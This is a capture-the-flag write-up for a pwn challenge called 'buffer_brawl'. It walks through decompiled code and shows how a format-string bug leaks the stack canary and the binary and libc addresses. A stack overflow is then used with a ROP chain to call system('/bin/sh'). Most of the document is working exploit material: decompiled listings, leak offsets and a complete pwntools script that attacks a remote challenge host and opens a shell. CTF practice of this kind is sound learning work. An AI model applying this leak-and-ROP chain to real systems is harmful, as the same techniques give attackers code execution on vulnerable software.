
Decompile `main()`:

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  banner();
  setup(argc, argv);
  welcome();
  menu();
}
```

In the menu, we have: 

```c
void __noreturn menu()
{
  int v0; // [rsp+14h] [rbp-44h] BYREF
  unsigned __int64 v1; // [rsp+18h] [rbp-40h]

  v1 = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("");
    puts("Choose:");
    puts("1. Throw a jab");
    puts("2. Throw a hook");
    puts("3. Throw an uppercut");
    puts("4. Slip");
    puts("5. Call off");
    printf("> ");
    __isoc99_scanf("%d", &v0);
    switch ( v0 )
    {
      case 1:
        jab();
        break;
      case 2:
        hook();
        break;
      case 3:
        uppercut();
        break;
      case 4:
        slip();
        break;
      case 5:
        TKO();
      default:
        puts("Invalid choice. Try again.");
        break;
    }
  }
}
```

There are some choices for us. For `jab`, it will subtract our `stack's life point` to 1. We have 100 `stack's life point` for starting. 

```c
int jab()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-10h]

  v1 = __readfsqword(0x28u);
  puts("\nYou threw a jab! -1 to the stack's life points.");
  --stack_life_points;
  if ( v1 == __readfsqword(0x28u) )
    return stack_check_up();
  else
    return hook();
}
```

A canary is set here. If stack is changed, it will called `stack_check_up()`: 

```c
int stack_check_up()
{
  unsigned __int64 v0; // rax
  __int64 v2; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-10h]

  v3 = __readfsqword(0x28u);                    // Canary
  if ( stack_life_points == 13 )
  {
    puts("\nThe stack got dizzy! Now it's your time to win!");
    puts("Enter your move: ");
    __isoc99_scanf("%s", &v2);                  // Buffer Overflow
    v0 = v3 - __readfsqword(0x28u);
    if ( !v0 )
      return v0;
LABEL_7:
    TKO();
  }
  if ( stack_life_points <= 0 )
  {
    puts("\nStack fainted! You're too brutal for it!");
    exit(0);
  }
  if ( v3 != __readfsqword(0x28u) )
    goto LABEL_7;
  LODWORD(v0) = printf("\nStack's life points: %d\n", (unsigned int)stack_life_points);
  return v0;
}
```

- If our `stack_life_point` is 13, we can input a unlimited string, so a buffer overflow bug here.
- If our `stack_life_point` is less than 0, then the program is end. 
- Else, it will printout the current `stack_life_point` for us. It also checks if canary is changed or not. If it is changed, it will called to `TKO()`, which ends our program too.
- 
```c
void __noreturn TKO()
{
  puts("\nYou've been hit hard by the stack!\nTKO!");
  exit(0);
}
```

- For `hook()` and `uppercut()`, we lose -2 and -3 `stack_life_point` respectively. In `slip()`:

```c
unsigned __int64 slip()
{
  unsigned __int64 result; // rax
  char v1[40]; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  puts("\nTry to slip...\nRight or left?");
  read(0, v1, 29uLL);
  printf(v1);                                   // Format String
  result = v2 - __readfsqword(0x28u);
  if ( result )
    return stack_smash();
  return result;
}
```

There is a Format String bug here too. So we can use it to leak data. 
For leaking canary, it will appear in `%11$p` when we called`slip()`, because canary always ends with `00`. 

![image](https://hackmd.io/_uploads/H14WNrn71l.png)

Next, i will leak the libc by printout got of `puts`. But the binary address is dynamic, we first leak the binary first. In picture upthere, `%8$p` we can leak too. 
After having binary address, we can printout the value `got` of `puts`:

![image](https://hackmd.io/_uploads/ryUlSr3XJl.png)

Now we have the libc leak. Put it in the [libc.rip](https://libc.rip), we can have the libc. 

![image](https://hackmd.io/_uploads/rJZprHhQ1g.png)

Because there are so many libcs has that offset of `puts` too, so i need to leak `read`:

![image](https://hackmd.io/_uploads/HktHIrhQkx.png)

Download and patch it, we have libc now. 
I use ROPchain of libc to call system: 

![image](https://hackmd.io/_uploads/HkAzrB37ke.png)

You can find `pop rdi ; ret` with ROPgadget:

![image](https://hackmd.io/_uploads/HkG8SSn7yx.png)

Script: 
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./buffer_brawl_patched")
libc = ELF("./libc.so.6")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("buffer-brawl.chal.wwctf.com", 1337)

    return r
def main():
	r = conn()
	input()
	def throwJab():
		r.sendlineafter(b'> ', b'1')
	def throwHook():
		r.sendlineafter(b'> ', b'2')
	def throwUppercut():
		r.sendlineafter(b'> ', b'3')
	def slip(data):
		r.sendlineafter(b'> ', b'4')
		r.recvuntil(b'Right or left?\n')
		r.sendline(data)
	def TKO():
		pass
	# Leak canary
	
	slip(b'%11$p')
	canary = int(r.recv(18), 16)
	info(b'Canary found: ' + hex(canary).encode())
	# Leak binary address 
	slip(b'%8$p')
	exe_leak = int(r.recv(14), 16)
	exe.address = exe_leak - 0x24e0
	info('Exe leak: ' + hex(exe_leak))
	info('Exe address: ' + hex(exe.address))
	# Leak libc address 
	slip(b'%7$s\0\0\0\0' + p64(exe.address + 0x3fb8))
	libc_leak = u64(r.recv(6) + b'\0\0')
	info(b'Libc leak: ' + hex(libc_leak).encode())
	libc.address = libc_leak - libc.sym['read']
	info(b'Libc base address: ' + hex(libc.address).encode())
	pause()
	bin_sh = next(libc.search('/bin/sh'))
	ret = libc.address +  0x0f8c92
	system = libc.sym['system']
	for i in range(29):
		throwUppercut()
	poprdi = libc.address + 0x2a3e5
	ret = poprdi + 1
	payload = b'A' * 24
	payload += p64(canary)
	payload += b"B" * 8
	payload += p64(poprdi) # pop rdi
	payload += p64(bin_sh) # "/bin/sh"
	payload += p64(ret) # ret;
	payload += p64(system) # system()
	r.sendlineafter(b'Enter your move: \n', payload) 
	# pause()
	r.interactive()

if __name__ == "__main__":
    main() 
```
